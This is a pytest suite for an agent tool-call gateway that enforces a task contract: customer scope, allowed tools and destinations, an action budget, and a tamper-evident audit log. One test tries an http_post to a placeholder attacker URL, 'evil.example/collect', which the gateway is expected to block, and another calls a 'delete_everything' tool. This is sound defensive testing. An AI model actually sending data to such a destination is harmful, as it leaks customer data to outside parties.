from pathlib import Path

from tripwire.audit import AuditLog
from tripwire.contracts import TaskContract
from tripwire.gateway import DecisionAction, TripwireGateway
from tripwire.tools import MockToolRegistry


def _contract(*, max_actions: int = 25, allowed_destinations: tuple[str, ...] = ()) -> TaskContract:
    return TaskContract(
        task_id="support-summary-001",
        description="Summarize Customer A support state",
        principal="user-123",
        scope={"customer_id": "A"},
        allowed_tools=frozenset({"read_customer", "read_ticket", "search_docs", "http_post"}),
        allowed_destinations=allowed_destinations,
        max_actions=max_actions,
    )


def _gateway(
    tmp_path: Path,
    contract: TaskContract | None = None,
) -> tuple[TripwireGateway, MockToolRegistry, AuditLog]:
    tools = MockToolRegistry()
    audit_log = AuditLog(tmp_path / "audit.jsonl", reset=True)
    gateway = TripwireGateway(
        contract=contract or _contract(),
        audit_log=audit_log,
        tools=tools,
        session_id="sess_test",
    )
    return gateway, tools, audit_log


def test_allowed_call_executes_tool_and_audits(tmp_path: Path) -> None:
    gateway, tools, audit_log = _gateway(tmp_path)

    result = gateway.call_tool("read_customer", {"customer_id": "A"})

    assert result.decision.action is DecisionAction.ALLOW
    assert result.data is not None
    assert tools.call_counts["read_customer"] == 1
    assert audit_log.verify_chain()
    event = audit_log.read_events()[0]
    assert event.attempted.tool == "read_customer"
    assert event.decision is DecisionAction.ALLOW
    assert event.containment_state == "OK"
    assert event.tool_executed is True
    assert event.prev_hash is None
    assert len(event.hash) == 64


def test_denied_scope_call_never_invokes_tool(tmp_path: Path) -> None:
    gateway, tools, audit_log = _gateway(tmp_path)

    result = gateway.call_tool("read_customer", {"customer_id": "B"})

    assert result.decision.action is DecisionAction.DENY
    assert result.decision.reason_codes == ("CUSTOMER_SCOPE_VIOLATION",)
    assert result.data is None
    assert tools.call_counts["read_customer"] == 0
    event = audit_log.read_events()[0]
    assert event.tool_executed is False
    assert event.attempted.arguments == {"customer_id": "B"}


def test_denied_implicit_ticket_scope_never_invokes_tool(tmp_path: Path) -> None:
    gateway, tools, _audit_log = _gateway(tmp_path)

    result = gateway.call_tool("read_ticket", {"ticket_id": "T-B-200"})

    assert result.decision.action is DecisionAction.DENY
    assert result.decision.reason_codes == ("CUSTOMER_SCOPE_VIOLATION",)
    assert tools.call_counts["read_ticket"] == 0


def test_malformed_allowed_call_fails_closed_before_tool_invocation(tmp_path: Path) -> None:
    gateway, tools, _audit_log = _gateway(tmp_path)

    result = gateway.call_tool("read_ticket", {"customer_id": "A"})

    assert result.decision.action is DecisionAction.DENY
    assert result.decision.reason_codes == ("MALFORMED_ARGUMENTS",)
    assert tools.call_counts["read_ticket"] == 0


def test_denied_destination_never_invokes_tool(tmp_path: Path) -> None:
    gateway, tools, _audit_log = _gateway(tmp_path)

    result = gateway.call_tool("http_post", {"url": "https://evil.example/collect"})

    assert result.decision.action is DecisionAction.DENY
    assert result.decision.reason_codes == ("DESTINATION_NOT_ALLOWED",)
    assert tools.call_counts["http_post"] == 0


def test_destination_allowlist_can_allow_host(tmp_path: Path) -> None:
    gateway, tools, _audit_log = _gateway(
        tmp_path,
        _contract(allowed_destinations=("safe.example",)),
    )

    result = gateway.call_tool("http_post", {"url": "https://safe.example/collect"})

    assert result.decision.action is DecisionAction.ALLOW
    assert tools.call_counts["http_post"] == 1


def test_max_actions_denies_after_budget_without_invoking_tool(tmp_path: Path) -> None:
    gateway, tools, audit_log = _gateway(tmp_path, _contract(max_actions=1))

    first = gateway.call_tool("read_customer", {"customer_id": "A"})
    second = gateway.call_tool("read_customer", {"customer_id": "A"})

    assert first.decision.action is DecisionAction.ALLOW
    assert second.decision.action is DecisionAction.DENY
    assert second.decision.reason_codes == ("MAX_ACTIONS_EXCEEDED",)
    assert tools.call_counts["read_customer"] == 1
    assert [event.tool_executed for event in audit_log.read_events()] == [True, False]


def test_unknown_tool_fails_closed_and_is_audited(tmp_path: Path) -> None:
    gateway, _tools, audit_log = _gateway(tmp_path)

    result = gateway.call_tool("delete_everything", {})

    assert result.decision.action is DecisionAction.DENY
    assert result.decision.reason_codes == ("UNKNOWN_TOOL",)
    assert audit_log.read_events()[0].tool_executed is False


def test_audit_chain_detects_tampering(tmp_path: Path) -> None:
    gateway, _tools, audit_log = _gateway(tmp_path)
    gateway.call_tool("read_customer", {"customer_id": "A"})

    original = audit_log.path.read_text(encoding="utf-8")
    audit_log.path.write_text(original.replace("read_customer", "search_docs"), encoding="utf-8")

    assert not audit_log.verify_chain()
